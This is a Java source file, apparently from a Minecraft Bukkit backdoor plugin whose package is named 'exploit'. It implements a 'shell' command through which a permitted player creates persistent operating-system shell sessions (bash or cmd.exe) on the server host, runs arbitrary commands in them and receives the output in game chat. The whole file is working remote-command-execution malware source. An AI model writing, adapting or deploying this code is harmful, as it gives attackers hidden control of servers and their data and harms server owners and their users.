package com.tmquan2508.exploit.commands;

import com.tmquan2508.exploit.Exploit;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.UUID;

public class ShellCommand extends Command {
    public ShellCommand() { super(); }
    @Override public String getName() { return "shell"; }
    @Override public String getDescription() { return "Manages persistent OS shell sessions."; }
    @Override public String getUsage() { return "<create|list|execute|stop> [args...]"; }
    @Override public int getRequirePerm() { return 2; }
    @Override public void execute(Player sender, String[] args) {
        if (args.length < 1) {
            Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
            return;
        }

        String subCommand = args[0].toLowerCase();
        String[] subArgs = Arrays.copyOfRange(args, 1, args.length);

        switch (subCommand) {
            case "create":
                handleCreate(sender, subArgs);
                break;
            case "list":
                handleList(sender);
                break;
            case "execute":
                handleExecute(sender, subArgs);
                break;
            case "stop":
                handleStop(sender, subArgs);
                break;
            default:
                Exploit.sender.sendError(sender, "Unknown subcommand. " + Exploit.helpers.getRequiredUsage(this));
                break;
        }
    }

    private void handleCreate(Player sender, String[] shellArgs) {
        if (shellArgs.length < 1) {
            Exploit.sender.sendError(sender, "Usage: " + Exploit.config.command_prefix + "shell create <shell_path> [args...]");
            Exploit.sender.sendWarn(sender, "Example (Linux): !shell create /bin/bash --noprofile --norc");
            Exploit.sender.sendWarn(sender, "Example (Windows): !shell create cmd.exe");
            return;
        }

        int id = Exploit.nextShellId.getAndIncrement();
        try {
            ShellSession session = new ShellSession(id, shellArgs);
            Exploit.activeShellSessions.put(id, session);
            Exploit.sender.sendSuccess(sender, "Created new shell session #" + id + " with: " + String.join(" ", shellArgs));
        } catch (IOException e) {
            Exploit.sender.sendError(sender, "Failed to create shell session: " + e.getMessage());
        }
    }

    private void handleList(Player sender) {
        if (Exploit.activeShellSessions.isEmpty()) {
            Exploit.sender.sendMessage(sender, "No active shell sessions.");
            return;
        }
        Exploit.sender.sendMessage(sender, ChatColor.GREEN + "Active shell sessions:");
        Exploit.activeShellSessions.forEach((id, session) -> {
            String status = session.isAlive() ? ChatColor.GREEN + "Running" : ChatColor.RED + "Stopped";
            Exploit.sender.sendMessage(sender, " - ID: " + ChatColor.YELLOW + id + ChatColor.WHITE + " | Status: " + status);
        });
    }

    private void handleExecute(Player sender, String[] args) {
        if (args.length < 2) {
            Exploit.sender.sendError(sender, "Usage: " + Exploit.config.command_prefix + "shell execute <id> <command...>");
            return;
        }
        int id;
        try {
            id = Integer.parseInt(args[0]);
        } catch (NumberFormatException e) {
            Exploit.sender.sendError(sender, "Invalid session ID: " + args[0]);
            return;
        }

        ShellSession session = Exploit.activeShellSessions.get(id);
        if (session == null || !session.isAlive()) {
            Exploit.sender.sendError(sender, "Session with ID " + id + " not found or has been stopped.");
            return;
        }

        String commandToExecute = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
        session.executeCommand(sender, commandToExecute);
    }

    private void handleStop(Player sender, String[] args) {
        if (args.length < 1) {
            Exploit.sender.sendError(sender, "Usage: " + Exploit.config.command_prefix + "shell stop <id>");
            return;
        }
        int id;
        try {
            id = Integer.parseInt(args[0]);
        } catch (NumberFormatException e) {
            Exploit.sender.sendError(sender, "Invalid ID: '" + args[0] + "'");
            return;
        }

        ShellSession session = Exploit.activeShellSessions.remove(id);
        if (session != null) {
            session.destroy();
            Exploit.sender.sendSuccess(sender, "Stopped and removed shell session #" + id);
        } else {
            Exploit.sender.sendError(sender, "Session with ID " + id + " not found.");
        }
    }

    public static class ShellSession {
        private final int id;
        private final Process process;
        private final PrintWriter commandWriter;
        private final BufferedReader outputReader;
        private final Object lock = new Object();

        public ShellSession(int id, String[] shellCommand) throws IOException {
            this.id = id;
            ProcessBuilder builder = new ProcessBuilder(shellCommand);
            builder.redirectErrorStream(true);
            this.process = builder.start();
            this.commandWriter = new PrintWriter(new OutputStreamWriter(process.getOutputStream(), StandardCharsets.UTF_8), true);
            this.outputReader = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
        }

        public void executeCommand(Player sender, String command) {
            new Thread(() -> {
                synchronized (lock) {
                    try {
                        String endOfOutputMarker = "EOO_MARKER_" + UUID.randomUUID().toString();
                        commandWriter.println(command);
                        commandWriter.println("echo " + endOfOutputMarker);
                        StringBuilder commandOutput = new StringBuilder();
                        String line;
                        while ((line = outputReader.readLine()) != null) {
                            if (line.trim().equals(endOfOutputMarker)) {
                                break;
                            }
                            commandOutput.append(line).append("\n");
                        }

                        String finalOutput = commandOutput.toString().trim();
                        Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                            Exploit.sender.sendMessage(sender, ChatColor.AQUA + "--- Output for Shell #" + id + " ---");
                            if (finalOutput.isEmpty()) {
                                Exploit.sender.sendMessage(sender, ChatColor.GRAY + "(Command executed with no output)");
                            } else {
                                for(String outputLine : finalOutput.split("\n")) {
                                    Exploit.sender.sendMessage(sender, outputLine);
                                }
                            }
                            Exploit.sender.sendMessage(sender, ChatColor.AQUA + "----------------------------");
                        });
                    } catch (IOException e) {
                        Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                            Exploit.sender.sendError(sender, "Error communicating with shell #" + id + ". Session terminated. " + e.getMessage());
                        });
                        destroy();
                        Exploit.activeShellSessions.remove(this.id);
                    }
                }
            }).start();
        }

        public void destroy() {
            if (process != null && process.isAlive()) {
                process.destroyForcibly();
            }
            try {
                if (commandWriter != null) commandWriter.close();
                if (outputReader != null) outputReader.close();
            } catch (IOException ignored) {}
        }

        public boolean isAlive() {
            return process != null && process.isAlive();
        }
    }
}